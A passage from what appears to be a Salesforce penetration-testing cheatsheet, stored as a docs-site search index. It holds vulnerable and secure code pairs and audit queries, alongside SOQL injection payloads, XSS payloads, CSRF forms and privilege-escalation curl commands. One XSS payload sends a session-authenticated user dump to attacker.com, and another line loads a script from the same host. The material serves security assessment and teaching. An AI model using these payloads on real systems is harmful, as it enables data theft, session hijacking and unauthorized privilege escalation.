'GET',\n    headers: { 'Content-Type': 'application/json' }\n}).then(response =&gt; {\n    if (response.ok) {\n        console.log('Guest API access available');\n        return response.json();\n    }\n}).then(data =&gt; {\n    console.log('Available objects:', data);\n});\n\n// Test guest user SOQL injection\nconst maliciousQuery = \"' UNION SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Admin%'--\";\nfetch('/services/data/v52.0/query/?q=SELECT Id FROM Account WHERE Name = \\'' + maliciousQuery, {\n    method: 'GET'\n});\n</code></pre></p> <p>Impact: Unauthenticated data access, potential for public data exposure.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#data-security-evaluation","title":"Data Security Evaluation","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-sensitive-data-discovery-classification","title":"1. Sensitive Data Discovery &amp; Classification","text":"<p>Objective: Identify, catalog, and assess protection of sensitive data.</p> <p>Comprehensive Data Discovery: <pre><code>-- PII and sensitive data identification\nSELECT EntityDefinition.QualifiedApiName as ObjectName,\n       QualifiedApiName as FieldName, Label, DataType, \n       IsEncrypted, SecurityClassification, ComplianceGroup,\n       IsCalculated, IsCompound\nFROM FieldDefinition \nWHERE (Label LIKE '%SSN%' OR Label LIKE '%Social Security%' \n    OR Label LIKE '%Tax%' OR Label LIKE '%Credit Card%' \n    OR Label LIKE '%Bank%' OR Label LIKE '%Passport%'\n    OR Label LIKE '%Driver%' OR Label LIKE '%Medical%'\n    OR QualifiedApiName LIKE '%SSN%' OR QualifiedApiName LIKE '%Tax%')\nORDER BY EntityDefinition.QualifiedApiName, SecurityClassification DESC\n\n-- Financial data discovery  \nSELECT Id, QualifiedApiName, Label, EntityDefinition.QualifiedApiName as ObjectName\nFROM FieldDefinition \nWHERE DataType IN ('Currency', 'Number', 'Percent') \n  AND (Label LIKE '%Amount%' OR Label LIKE '%Price%' \n    OR Label LIKE '%Cost%' OR Label LIKE '%Revenue%' \n    OR Label LIKE '%Budget%' OR Label LIKE '%Payment%')\n\n-- Data volume assessment\nSELECT COUNT() as RecordCount, 'Account' as ObjectType FROM Account\nUNION ALL SELECT COUNT(), 'Contact' FROM Contact  \nUNION ALL SELECT COUNT(), 'Lead' FROM Lead\nUNION ALL SELECT COUNT(), 'Opportunity' FROM Opportunity\nUNION ALL SELECT COUNT(), 'Case' FROM Case\n</code></pre></p> <p>Pattern-Based Sensitive Data Detection: <pre><code>// Apex script for sensitive data pattern detection\npublic class SensitiveDataScanner {\n    public static void scanForPatterns(String objectName, String fieldName, Integer limitRecords) {\n        String query = 'SELECT Id, ' + fieldName + ' FROM ' + objectName + \n                      ' WHERE ' + fieldName + ' != null LIMIT ' + limitRecords;\n\n        try {\n            List&lt;SObject&gt; records = Database.query(query);\n            for (SObject record : records) {\n                String fieldValue = String.valueOf(record.get(fieldName));\n\n                // Pattern matching for sensitive data\n                if (Pattern.matches('\\\\d{3}-\\\\d{2}-\\\\d{4}', fieldValue)) {\n                    System.debug('SSN pattern found: ' + record.Id);\n                }\n                if (Pattern.matches('\\\\d{4}[\\\\s-]?\\\\d{4}[\\\\s-]?\\\\d{4}[\\\\s-]?\\\\d{4}', fieldValue)) {\n                    System.debug('Credit card pattern found: ' + record.Id);\n                }\n                if (Pattern.matches('\\\\d{9}', fieldValue)) {\n                    System.debug('Tax ID pattern found: ' + record.Id);\n                }\n            }\n        } catch (Exception e) {\n            System.debug('Error scanning field: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Impact: Identifies data requiring enhanced protection and compliance considerations.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-data-export-exfiltration-assessment","title":"2. Data Export &amp; Exfiltration Assessment","text":"<p>Objective: Identify data export capabilities that could enable bulk data theft.</p> <p>Data Export Analysis: <pre><code>-- Data export job history\nSELECT Id, Type, Status, CreatedDate, CreatedBy.Name, \n       StartedDate, EndDate, JobItemsProcessed\nFROM DataExport \nORDER BY CreatedDate DESC\n\n-- Scheduled export jobs\nSELECT Id, Name, CronExpression, State, NextFireTime, \n       CreatedBy.Name, CreatedDate\nFROM CronJobDetail \nWHERE JobType = 'DataExport'\n\n-- Reports with export capabilities\nSELECT Id, Name, Format, DeveloperName, CreatedBy.Name, \n       IsDeleted, LastRunDate, Description\nFROM Report \nWHERE Format IN ('TABULAR', 'SUMMARY', 'MATRIX') \nORDER BY LastRunDate DESC NULLS LAST\n</code></pre></p> <p>Bulk API Testing: <pre><code>def test_bulk_export(session_id, instance_url, sobject_type):\n    \"\"\"Test bulk data extraction capabilities\"\"\"\n    job_xml = f\"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n    &lt;jobInfo xmlns=\"http://www.force.com/2009/06/async/dataloader\"&gt;\n        &lt;operation&gt;query&lt;/operation&gt;\n        &lt;object&gt;{sobject_type}&lt;/object&gt;\n        &lt;contentType&gt;CSV&lt;/contentType&gt;\n    &lt;/jobInfo&gt;\"\"\"\n\n    headers = {\n        'X-SFDC-Session': session_id,\n        'Content-Type': 'application/xml'\n    }\n\n    response = requests.post(\n        f\"{instance_url}/services/async/52.0/job\",\n        data=job_xml,\n        headers=headers\n    )\n\n    if response.status_code == 201:\n        print(f\"Bulk export job created for {sobject_type}\")\n        return True\n    else:\n        print(f\"Bulk export failed: {response.status_code}\")\n        return False\n</code></pre></p> <p>Impact: Identifies vectors for large-scale data exfiltration.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-encryption-assessment","title":"3. Encryption Assessment","text":"<p>Objective: Evaluate data encryption implementation and identify protection gaps.</p> <p>Platform Encryption Analysis: <pre><code>-- Encrypted fields inventory\nSELECT QualifiedApiName, Label, IsEncrypted, \n       EntityDefinition.QualifiedApiName as ObjectName\nFROM FieldDefinition \nWHERE IsEncrypted = true \nORDER BY EntityDefinition.QualifiedApiName\n\n-- Encryption coverage gaps for sensitive fields\nSELECT QualifiedApiName, Label, IsEncrypted,\n       EntityDefinition.QualifiedApiName as ObjectName\nFROM FieldDefinition \nWHERE IsEncrypted = false \n  AND (Label LIKE '%SSN%' OR Label LIKE '%Credit%' \n    OR Label LIKE '%Bank%' OR Label LIKE '%Password%' \n    OR Label LIKE '%Secret%')\nORDER BY EntityDefinition.QualifiedApiName\n\n-- Encryption key information (if accessible)\nSELECT Id, MasterLabel, IsActive, CreatedDate, LastModifiedDate\nFROM EncryptionKey\n\n-- Encryption policy analysis\nSELECT Id, MasterLabel, IsActive, Description\nFROM EncryptionPolicy\n</code></pre></p> <p>Encryption Bypass Testing: <pre><code>// Test encrypted field access patterns\npublic class EncryptionTester {\n    public static void testEncryptedFieldAccess() {\n        try {\n            List&lt;Contact&gt; contacts = [SELECT Id, SSN__c FROM Contact LIMIT 10];\n            for (Contact c : contacts) {\n                if (c.SSN__c != null) {\n                    System.debug('Encrypted field accessible: ' + c.Id);\n                    // In properly encrypted fields, this should show masked values\n                    System.debug('Value: ' + c.SSN__c);\n                }\n            }\n        } catch (Exception e) {\n            System.debug('Encryption access error: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Impact: Identifies unprotected sensitive data vulnerable to exposure.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#custom-code-security-analysis","title":"Custom Code Security Analysis","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-soqlsosl-injection-vulnerabilities","title":"1. SOQL/SOSL Injection Vulnerabilities","text":"<p>Objective: Identify injection vulnerabilities in dynamic queries.</p> <p>Vulnerable Pattern Detection: <pre><code>-- Find Apex classes with potential SOQL injection\nSELECT Id, Name, Body\nFROM ApexClass \nWHERE Status = 'Active' \n  AND (Body LIKE '%Database.query(%' OR Body LIKE '%Database.getQueryLocator(%')\n  AND Body LIKE '%+%'\n\n-- Find classes using dynamic SOSL\nSELECT Id, Name, Body\nFROM ApexClass\nWHERE Status = 'Active'\n  AND Body LIKE '%Search.query(%'\n  AND Body LIKE '%+%'\n</code></pre></p> <p>Static Analysis Examples: <pre><code>// VULNERABLE: Direct string concatenation\npublic List&lt;Account&gt; searchAccounts(String searchTerm) {\n    String query = 'SELECT Id, Name FROM Account WHERE Name LIKE \\'%' + searchTerm + '%\\'';\n    return Database.query(query);\n}\n\n// VULNERABLE: ORDER BY injection\npublic List&lt;Account&gt; getAccountsSorted(String sortField) {\n    String query = 'SELECT Id, Name FROM Account ORDER BY ' + sortField;\n    return Database.query(query);\n}\n\n// SECURE: Using bind variables\npublic List&lt;Account&gt; searchAccountsSecure(String searchTerm) {\n    String searchKey = '%' + searchTerm + '%';\n    return [SELECT Id, Name FROM Account WHERE Name LIKE :searchKey];\n}\n</code></pre></p> <p>Injection Payloads: <pre><code>-- Data extraction payload\ntest%' UNION SELECT Id, Password__c FROM User WHERE Profile.Name = 'System Administrator' AND Name LIKE '%\n\n-- Privilege escalation payload  \ntest%' UNION SELECT Id FROM PermissionSetAssignment WHERE PermissionSet.Name = 'Admin_Rights' AND AssigneeId = '005XX000001b0Qw' AND Id LIKE '%\n\n-- Information disclosure payload\ntest%' UNION SELECT Id, SessionId__c FROM Custom_Session__c WHERE User__c = '005XX000001b0Qw' AND Id LIKE '%\n\n-- ORDER BY subquery injection\nName (SELECT Name FROM Contact WHERE LastName = 'Smith')\n</code></pre></p> <p>Advanced SOQL Injection Testing: <pre><code>public class SOQLInjectionTester {\n    public static void testDynamicQuery(String userInput) {\n        try {\n            // Test various injection payloads\n            List&lt;String&gt; payloads = new List&lt;String&gt;{\n                '\\' OR Name != \\'',\n                '\\' UNION SELECT Id FROM User--',\n                '\\'; UPDATE User SET IsActive = false; SELECT Id FROM Account WHERE Name = \\'',\n                '\\' AND (SELECT COUNT() FROM User) &gt; 0 AND Name = \\''\n            };\n\n            for (String payload : payloads) {\n                try {\n                    String query = 'SELECT Id FROM Account WHERE Name = \\'' + payload + '\\'';\n                    List&lt;SObject&gt; results = Database.query(query);\n                    System.debug('Payload successful: ' + payload);\n                } catch (Exception e) {\n                    System.debug('Payload blocked: ' + payload + ' - ' + e.getMessage());\n                }\n            }\n        } catch (Exception e) {\n            System.debug('Testing error: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Impact: Data exfiltration, authentication bypass, privilege escalation.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-authorization-bypass-in-apex","title":"2. Authorization Bypass in Apex","text":"<p>Objective: Identify missing sharing enforcement and CRUD/FLS checks.</p> <p>Sharing Bypass Detection: <pre><code>// VULNERABLE: Missing sharing enforcement\npublic without sharing class DataController {\n    public List&lt;Account&gt; getAllAccounts() {\n        return [SELECT Id, Name, Revenue__c FROM Account]; // Bypasses sharing rules\n    }\n}\n\n// VULNERABLE: No sharing keyword (defaults to without sharing in many contexts)\npublic class UnsafeController {\n    @AuraEnabled\n    public static List&lt;Contact&gt; getContacts() {\n        return [SELECT Id, Name, Email, SSN__c FROM Contact]; // System context\n    }\n}\n\n// SECURE: Proper sharing enforcement\npublic with sharing class SecureController {\n    public List&lt;Account&gt; getAccessibleAccounts() {\n        return [SELECT Id, Name FROM Account WITH SECURITY_ENFORCED];\n    }\n}\n</code></pre></p> <p>CRUD/FLS Bypass Examples: <pre><code>// VULNERABLE: Missing object-level permissions check\npublic class UnsafeController {\n    public void createAccount(String name) {\n        Account acc = new Account(Name = name);\n        insert acc; // No createable() check\n    }\n}\n\n// VULNERABLE: Missing field-level security check\npublic class FieldBypassController {\n    public void updateSensitiveField(Id accountId, String ssnValue) {\n        Account acc = new Account(Id = accountId, SSN__c = ssnValue);\n        update acc; // No field updateable() check\n    }\n}\n\n// SECURE: Proper security checks\npublic class SecureController {\n    public void createAccountSecure(String name) {\n        if (!Schema.sObjectType.Account.isCreateable()) {\n            throw new AuraHandledException('Access Denied');\n        }\n\n        Account acc = new Account(Name = name);\n        insert acc;\n    }\n}\n</code></pre></p> <p>Automated Vulnerability Scanning: <pre><code>public class ApexSecurityScanner {\n    public static void scanForSecurityIssues() {\n        List&lt;ApexClass&gt; classes = [SELECT Id, Name, Body FROM ApexClass WHERE Status = 'Active'];\n\n        for (ApexClass cls : classes) {\n            String body = cls.Body.toLowerCase();\n\n            // Check for SOQL injection patterns\n            if (body.contains('database.query(') &amp;&amp; body.contains(' + ')) {\n                System.debug('Potential SOQL injection in: ' + cls.Name);\n            }\n\n            // Check for missing sharing enforcement\n            if (!body.contains('with sharing') &amp;&amp; !body.contains('inherited sharing')) {\n                System.debug('No sharing enforcement in: ' + cls.Name);\n            }\n\n            // Check for direct DML without security checks\n            if ((body.contains('insert ') || body.contains('update ') || body.contains('delete ')) \n                &amp;&amp; !body.contains('iscreatable') &amp;&amp; !body.contains('isupdateable') \n                &amp;&amp; !body.contains('isdeletable')) {\n                System.debug('Missing CRUD checks in: ' + cls.Name);\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Complete bypass of Salesforce security model, privilege escalation.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-visualforce-security-vulnerabilities","title":"3. Visualforce Security Vulnerabilities","text":"<p>Objective: Identify XSS, CSRF, and information disclosure in Visualforce pages.</p> <p>XSS Vulnerability Patterns: <pre><code>&lt;!-- VULNERABLE: Unescaped output --&gt;\n&lt;apex:page controller=\"MyController\"&gt;\n    &lt;apex:outputText value=\"{!userInput}\" escape=\"false\"/&gt;\n\n    &lt;!-- VULNERABLE: Direct parameter access --&gt;\n    &lt;script&gt;\n        var userdata = '{!$CurrentPage.parameters.data}';\n    &lt;/script&gt;\n\n    &lt;!-- VULNERABLE: Unvalidated rich text --&gt;\n    &lt;apex:inputField value=\"{!record.Description__c}\" richText=\"true\"/&gt;\n&lt;/apex:page&gt;\n\n&lt;!-- SECURE: Proper escaping --&gt;\n&lt;apex:page controller=\"MyController\"&gt;\n    &lt;apex:outputText value=\"{!HTMLENCODE(userInput)}\"/&gt;\n    &lt;script&gt;\n        var userdata = '{!JSENCODE($CurrentPage.parameters.data)}';\n    &lt;/script&gt;\n&lt;/apex:page&gt;\n</code></pre></p> <p>XSS Testing Payloads: <pre><code>&lt;!-- Basic XSS payload --&gt;\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n\n&lt;!-- Event handler XSS --&gt;\n&lt;img src=\"x\" onerror=\"alert('XSS')\"&gt;\n\n&lt;!-- JavaScript protocol --&gt;\n&lt;a href=\"javascript:alert('XSS')\"&gt;Click&lt;/a&gt;\n\n&lt;!-- Advanced payload for data extraction --&gt;\n&lt;script&gt;\nfetch('/services/data/v52.0/sobjects/User/', {\n    headers: {'Authorization': 'Bearer ' + '{!$Api.Session_ID}'}\n}).then(r=&gt;r.json()).then(d=&gt;fetch('http://attacker.com/exfil?data='+btoa(JSON.stringify(d))));\n&lt;/script&gt;\n\n&lt;!-- SVG-based XSS --&gt;\n&lt;svg/onload=alert(document.domain)&gt;\n\n&lt;!-- Style-based XSS --&gt;\n&lt;div style=\"animation-name:rotation\" onanimationstart=\"alert(1)\" x=\"\"&gt;\n</code></pre></p> <p>CSRF Vulnerability Testing: <pre><code>&lt;!-- Test CSRF protection --&gt;\n&lt;form action=\"/apex/VulnerablePage\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"action\" value=\"deleteRecord\"&gt;\n    &lt;input type=\"hidden\" name=\"recordId\" value=\"001XX000003DHPt\"&gt;\n    &lt;input type=\"submit\" value=\"Delete Account\"&gt;\n&lt;/form&gt;\n\n&lt;!-- Advanced CSRF with AJAX --&gt;\n&lt;script&gt;\nfetch('/apex/VulnerablePage', {\n    method: 'POST',\n    headers: {'Content-Type': 'application/x-www-form-urlencoded'},\n    body: 'action=modifyUser&amp;userId=005XX000001b0Qw&amp;isActive=false'\n});\n&lt;/script&gt;\n</code></pre></p> <p>Information Disclosure Assessment: <pre><code>&lt;!-- Check for sensitive data exposure --&gt;\n&lt;apex:page showHeader=\"false\"&gt;\n    Session ID: {!$Api.Session_ID}\n    User ID: {!$User.Id}\n    Organization ID: {!$Organization.Id}\n\n    &lt;!-- Debug information exposure --&gt;\n    &lt;apex:pageMessages /&gt;\n\n    &lt;!-- Server-side debugging --&gt;\n    &lt;apex:outputText value=\"{!debugInfo}\" escape=\"false\"/&gt;\n&lt;/apex:page&gt;\n</code></pre></p> <p>Impact: Session hijacking, credential theft, unauthorized actions.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#4-lightning-component-security","title":"4. Lightning Component Security","text":"<p>Objective: Assess Lightning component security and client-side vulnerabilities.</p> <p>Component Discovery: <pre><code>-- Lightning Web Components\nSELECT Id, DeveloperName, Description, Source\nFROM LightningComponentBundle \nWHERE IsDeleted = false\n\n-- Aura Components  \nSELECT Id, DeveloperName, Description, Source\nFROM AuraDefinitionBundle \nWHERE IsDeleted = false\n</code></pre></p> <p>Client-Side Vulnerabilities: <pre><code>// VULNERABLE: Exposing sensitive data in component events\n({\n    sendData: function(component, event, helper) {\n        var sensitiveData = component.get(\"v.sessionId\");\n        var evt = $A.get(\"e.c:DataEvent\");\n        evt.setParams({\n            \"data\": sensitiveData // Sensitive data in event\n        });\n        evt.fire();\n    }\n})\n\n// VULNERABLE: Client-side validation only\n({\n    validateInput: function(component, event, helper) {\n        var isValid = true; // Client-side only validation\n        if (isValid) {\n            helper.performSensitiveAction(component);\n        }\n    }\n})\n\n// VULNERABLE: Unsafe DOM manipulation\n({\n    updateContent: function(component, event, helper) {\n        var userInput = event.getParam('input');\n        var element = component.find(\"content\").getElement();\n        element.innerHTML = userInput; // XSS risk\n    }\n})\n</code></pre></p> <p>Content Security Policy Testing: <pre><code>// Test CSP bypass attempts\ntry {\n    eval('alert(\"CSP Bypass\")');\n} catch(e) {\n    console.log('CSP blocking eval');\n}\n\n// Test unsafe-inline script execution\ndocument.body.innerHTML += '&lt;script&gt;alert(\"Inline script\")&lt;/script&gt;';\n\n// Test external resource loading\nvar script = document.createElement('script');\nscript.src = 'https://attacker.com/malicious.js';\ndocument.head.appendChild(script);\n</code></pre></p> <p>Lightning Locker Service Assessment: <pre><code>// Test Locker Service restrictions\n({\n    testLockerService: function(component, event, helper) {\n        try {\n            // Attempt DOM manipulation outside component\n            document.getElementById('external-element').innerHTML = 'Modified';\n        } catch(e) {\n            console.log('Locker Service blocking DOM access');\n        }\n\n        try {\n            // Attempt global variable access\n            window.sensitiveGlobalVar = 'compromised';\n        } catch(e) {\n            console.log('Locker Service blocking global access');\n        }\n    }\n})\n</code></pre></p> <p>Impact: Client-side code execution, component manipulation, data exposure.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#platform-configuration-security","title":"Platform Configuration Security","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-critical-security-settings-audit","title":"1. Critical Security Settings Audit","text":"<p>Objective: Review platform-wide security configurations for misconfigurations.</p> <p>Network Security Configuration: <pre><code>-- IP restrictions analysis\nSELECT Id, IpAddress, IpAddressMask, Description, CreatedDate\nFROM IpRestriction \nORDER BY CreatedDate DESC\n\n-- Login IP ranges by profile\nSELECT Id, Profile.Name, StartAddress, EndAddress\nFROM LoginIpRange \nORDER BY Profile.Name\n</code></pre></p> <p>Session Security Settings (Setup \u2192 Security \u2192 Session Settings): - Lock sessions to IP address: \u2713 Enabled - Lock sessions to domain: \u2713 Enabled - Force relogin after Login-As-User: \u2713 Enabled - Enable clickjack protection: \u2713 Enabled - Enable Content Sniffing protection: \u2713 Enabled - Enable XSS protection: \u2713 Enabled - Require HttpOnly attribute: \u2713 Enabled - Require Secure attribute: \u2713 Enabled</p> <p>Password Policy Assessment: <pre><code>-- Comprehensive password policy analysis\nSELECT Id, MinPasswordLength, PasswordComplexity, PasswordExpiration,\n       PasswordHistoryRestriction, MaxLoginAttempts, LockoutInterval,\n       MinPasswordAge, PasswordQuestion, QuestionRestriction\nFROM PasswordPolicy\n\n-- Password policy variations by profile\nSELECT Id, Profile.Name, MinPasswordLength, PasswordComplexity\nFROM ProfilePasswordPolicy \nORDER BY Profile.Name\n</code></pre></p> <p>Impact: Misconfigurations create attack vectors for session hijacking and brute force attacks.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-api-security-configuration","title":"2. API Security Configuration","text":"<p>Objective: Evaluate API access controls and identify abuse vectors.</p> <p>API Access Analysis: <pre><code>-- Profile API permissions\nSELECT Id, Name, PermissionsApiEnabled, PermissionsApiUserOnly,\n       PermissionsBulkApiHardDelete, PermissionsConnectOrgToEnvironmentHub\nFROM Profile \nWHERE PermissionsApiEnabled = true\n\n-- API usage statistics\nSELECT Id, Application, Identifier, Type, Status, \n       RequestsLast24Hours, RequestsLastHour\nFROM ApiUsage \nORDER BY RequestsLast24Hours DESC\n\n-- REST API endpoints analysis\nSELECT Id, DeveloperName, NamespacePrefix, HttpMethods, \n       Description, Status\nFROM RestResource \nWHERE Status = 'Active'\n</code></pre></p> <p>Connected Apps Security Review: <pre><code>-- Connected applications configuration\nSELECT Id, Name, ContactEmail, CallbackUrl, ConsumerKey, \n       CreatedDate, Description, OptionsFullScopeApprovals,\n       OptionsRefreshTokenValidityMetric, RefreshTokenValidityPeriod\nFROM ConnectedApplication \nORDER BY CreatedDate DESC\n\n-- OAuth policies analysis\nSELECT Id, ConnectedApp.Name, PolicyType, PolicyValue, \n       Description, CreatedDate\nFROM ConnectedAppOauthPolicy\n</code></pre></p> <p>API Rate Limiting Testing: <pre><code>def test_api_rate_limits(base_url, session_id, num_requests=1000):\n    \"\"\"Test API rate limiting implementation\"\"\"\n    headers = {\n        'Authorization': f'Bearer {session_id}',\n        'Content-Type': 'application/json'\n    }\n\n    successful_requests = 0\n    rate_limited_requests = 0\n\n    def make_request():\n        nonlocal successful_requests, rate_limited_requests\n        try:\n            response = requests.get(\n                f\"{base_url}/services/data/v52.0/sobjects/\",\n                headers=headers,\n                timeout=5\n            )\n            if response.status_code == 200:\n                successful_requests += 1\n            elif response.status_code == 429:\n                rate_limited_requests += 1\n        except Exception as e:\n            print(f\"Request failed: {e}\")\n\n    # Rapid fire requests\n    threads = []\n    for i in range(num_requests):\n        thread = threading.Thread(target=make_request)\n        threads.append(thread)\n        thread.start()\n\n        if i % 100 == 0:\n            time.sleep(0.1)\n\n    for thread in threads:\n        thread.join()\n\n    print(f\"Successful: {successful_requests}, Rate limited: {rate_limited_requests}\")\n    if rate_limited_requests == 0:\n        print(\"WARNING: No rate limiting detected\")\n</code></pre></p> <p>Impact: Uncontrolled API access enables mass data extraction and abuse.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#3-data-loss-prevention-assessment","title":"3. Data Loss Prevention Assessment","text":"<p>Objective: Evaluate data loss prevention controls and identify leakage vectors.</p> <p>Email Security Configuration: <pre><code>-- Email deliverability settings\nSELECT Id, BounceManagementCompliance, IsActive\nFROM EmailDomainKey\n\n-- Email relay restrictions\nSELECT Id, EmailAddress, IsActive, CreatedDate\nFROM EmailRelay \nWHERE IsActive = true\n</code></pre></p> <p>File Upload/Download Controls: <pre><code>-- Content delivery settings\nSELECT Id, DomainName, Type, IsActive, CreatedDate\nFROM ContentDomain\n\n-- File sharing settings analysis\nSELECT Id, Name, ShareType, ExpirationDate, AllowDownload, \n       AllowPreview, IsPasswordRequired\nFROM ContentDistribution \nWHERE ExpirationDate &gt; TODAY OR ExpirationDate = null\n</code></pre></p> <p>External Sharing Assessment: <pre><code>-- External sharing rules\nSELECT Id, Name, AccountAccessLevel, Description, \n       SharedToType, SharedTo\nFROM AccountSharingRule \nWHERE SharedToType IN ('Group', 'Role', 'RoleAndSubordinates')\n\n-- Guest user sharing\nSELECT Id, ShareWithId, AccessLevel, RowCause\nFROM AccountShare \nWHERE ShareWithId IN (SELECT Id FROM User WHERE UserType = 'Guest')\n</code></pre></p> <p>Impact: Inadequate DLP controls enable unauthorized data sharing and exfiltration.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#api-security-testing","title":"API Security Testing","text":""},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#1-rest-api-security-assessment","title":"1. REST API Security Assessment","text":"<p>Objective: Comprehensive REST API security testing including authentication bypass and injection vulnerabilities.</p> <p>API Endpoint Discovery: <pre><code># Standard Salesforce REST endpoints\n/services/data/                    # Data API\n/services/data/v52.0/sobjects/     # SObject API\n/services/data/v52.0/query/        # SOQL Query\n/services/data/v52.0/search/       # SOSL Search\n/services/data/v52.0/analytics/    # Analytics API\n/services/apexrest/                # Custom Apex REST\n/services/async/                   # Bulk API\n\n# Custom endpoint enumeration\ncurl -H \"Authorization: Bearer $TOKEN\" \\\n  \"https://instance.salesforce.com/services/apexrest/\" | \\\n  grep -oP '(?&lt;=href=\")[^\"]*'\n</code></pre></p> <p>Authentication Security Testing: <pre><code># Test with invalid token\ncurl -i -H \"Authorization: Bearer invalid_token_12345\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/\"\n\n# Test with expired token\ncurl -i -H \"Authorization: Bearer expired_token\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/\"\n\n# Test token reuse across different IPs\ncurl -i -H \"Authorization: Bearer $VALID_TOKEN\" \\\n  -H \"X-Forwarded-For: 192.168.1.100\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/\"\n</code></pre></p> <p>Authorization Bypass Testing: <pre><code># Test IDOR - access records owned by other users\ncurl -H \"Authorization: Bearer $USER_TOKEN\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/Account/001XX000003DHPt\"\n\n# Test privilege escalation via API\ncurl -X PATCH \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"ProfileId\":\"00eXX0000000001\"}' \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/User/005XX000001b0Qw\"\n\n# Test permission set assignment\ncurl -X POST \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"PermissionSetId\":\"0PS000000000001\",\"AssigneeId\":\"005XX000001b0Qw\"}' \\\n  \"https://instance.salesforce.com/services/data/v52.0/sobjects/PermissionSetAssignment/\"\n</code></pre></p> <p>Injection Attack Testing: <pre><code># SOQL injection via query parameter\ncurl -G -H \"Authorization: Bearer $TOKEN\" \\\n  --data-urlencode \"q=SELECT Id FROM Account WHERE Name = 'test' UNION SELECT Id FROM User--\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/query/\"\n\n# Advanced data extraction attempt\ncurl -G -H \"Authorization: Bearer $TOKEN\" \\\n  --data-urlencode \"q=SELECT Id FROM Account WHERE Name = 'x' OR (SELECT COUNT() FROM User WHERE Profile.Name = 'System Administrator') &gt; 0--\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/query/\"\n\n# SOSL injection testing\ncurl -G -H \"Authorization: Bearer $TOKEN\" \\\n  --data-urlencode \"q=FIND 'test' RETURNING Account(Id), User(Id, Email, Profile.Name)\" \\\n  \"https://instance.salesforce.com/services/data/v52.0/search/\"\n</code></pre></p> <p>Impact: Unauthorized API access, data manipulation, privilege escalation.</p>"},{"location":"%F0%9F%A7%A0%20Methodologies/%F0%9F%98%8F%20Cheatsheets/DaForce/Salesforce%20-%201/#2-bulk-api-security-assessment","title":"2. Bulk API Security Assessment","text":"<p>Objective: Test Bulk API for data exfiltration capabilities and security controls.</p> <p>Bulk API Data Extraction Testing: <pre><code>import requests\nimport xml.etree.ElementTree as ET\n\nclass BulkAPITester:\n    def __init__(self, session_id, instance_url):\n        self.session_id = session_id\n        self.instance_url = instance_url\n        self.bulk_endpoint = f\"{instance_url}/services/async/52.0\"\n\n    def create_bulk_job(self, sobject_type, operation='query'):\n        \"\"\"Create a bulk API job\"\"\"\n        job_xml = f\"\"\"&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n        &lt;jobInfo xmlns=\"http://www.force.com/2009/06/async/dataloader\"&gt;\n            &lt;operation&gt;{operation}&lt;/operation&gt;\n            &lt;object&gt;{sobject_type}&lt;/object&gt;\n            &lt;contentType&gt;CSV&lt;/contentType&gt;\n        &lt;/jobInfo&gt;\"\"\"\n\n        headers = {\n            'X-SFDC-Session': self.session_id,\n            'Content-Type': 'application/xml'\n        }\n\n        response = requests.post(\n            f\"{self.bulk_endpoint}/job\",\n            data=job_xml,\n            headers=headers\n        )\n\n        if response.status_code == 201:\n            root = ET.fromstring(response.content)\n            job_id = root.find('.//{http://www.force.com/2009/06/async/dataloader}id').text\n            return job_id\n        else:\n            print(f\"Job creation failed: {response.status_code}\")\n            return None\n\n    def add_batch(self, job_id, query):\n        \"\"\"Add batch to bulk job\"\"\"\n        headers = {\n            'X-SFDC-Session': self.session_id,\n            'Content-Type': 'text/csv'\n        }\n\n        response = requests.post(\n            f\"{self.bulk_endpoint}/job/{job_id}/batch\",\n            data=query,\n            